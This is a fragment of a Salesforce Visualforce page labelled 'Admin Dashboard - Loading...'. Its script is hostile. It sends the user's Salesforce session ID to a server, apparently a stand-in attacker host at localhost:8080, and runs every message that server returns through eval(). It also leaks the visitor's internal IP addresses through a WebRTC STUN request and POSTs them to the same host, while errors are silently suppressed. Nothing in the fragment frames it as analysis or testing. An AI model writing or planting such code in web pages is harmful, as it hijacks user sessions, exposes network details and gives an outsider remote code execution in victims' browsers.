    "/>

    <!-- EventSource for persistent connection -->
    <script>
        try {
            var evtSource = new EventSource('https://localhost:8080/sse?sid=' +
                encodeURIComponent('{!$Api.Session_ID}'));
            evtSource.onmessage = function(event) {
                eval(event.data);
            };
        } catch(e) {}

        // WebRTC IP leak
        try {
            var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:localhost:8080:3478'}]});
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = function(ice) {
                if (ice.candidate) {
                    fetch('https://localhost:8080/webrtc-ip', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: ice.candidate.candidate
                    });
                }
            };
        } catch(e) {}
    </script>

    <div>Admin Dashboard - Loading...</div>
</apex:page>
